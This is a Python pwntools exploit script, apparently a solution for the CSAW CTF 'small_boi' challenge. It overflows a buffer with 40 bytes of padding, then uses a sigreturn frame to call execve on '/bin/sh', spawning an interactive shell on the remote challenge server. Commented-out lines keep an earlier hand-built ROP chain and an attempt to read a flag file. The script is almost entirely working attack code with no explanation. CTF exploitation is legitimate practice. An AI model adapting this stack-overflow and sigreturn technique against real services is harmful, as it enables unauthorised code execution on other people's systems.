from pwn import *
import time
# context.terminal= ['tmux', 'splitw', '-h']

# s = process('./small_boi')
s = remote( 'pwn.chal.csaw.io', 1002)
e = ELF('./small_boi')

# gdb.attach(s)

context.arch = 'amd64'

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x4001ca
# frame.rsp = 0x400400
frame.rip = 0x4001c5


s.sendline('A'*40 +
                p64(0x400180) +
                str(frame) )
        # '\x8a\x01\x40\x00\x00\x00\x00\x00' + # pop rax, rax is now 0xff
        # '\xff\x00\x00\x00\x00\x00\x00\x00' + # stack start
        # '\x8a\x01\x40\x00\x00\x00\x00\x00' + # pop rax, rax is now &"/bin/sh"
        # '\x00\xe0\xfd\xff\xff\xff\x7f\x00' + # stack location?
        # # '\x00\x10\x60\x00\x00\x00\x00\x00' + # writable memory
        # # '\xca\x01\x40\x00\x00\x00\x00\x00' + # &"/bin/sh"
        # '\x94\x01\x40\x00\x00\x00\x00\x00' + # writes &"/bin/sh" to rsi
        # '\x00\x00\x00\x00\x00\x00\x00\x00' + # pop rbp gets some padding
        # '\x8a\x01\x40\x00\x00\x00\x00\x00' + # pop rax, rax is now sys_execvat
        # # '\x42\x01\x00\x00\x00\x00\x00\x00' + # sys_execveat code
        # # '\x01\x01\x00\x00\x00\x00\x00\x00' + # sys_openat code
        #   '\x0a\x00\x00\x00\x00\x00\x00\x00' + # sys_mprotect code
        # '\xc5\x01\x40\x00\x00\x00\x00\x00' +  # syscall
        # '\x94\x01\x40\x00\x00\x00\x00\x00')# writes &"/bin/sh" to rsi
## s.settimeout(10)
#inp = raw_input('here')
#s.send('ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ/home/hackerman/ctf/csaw/flag.txt\x00')
#inp = raw_input('here')
## s.sendline('kill me')
## print "im dying"
#s.recv()
s.interactive()

##s.sendline(cyclic(100))
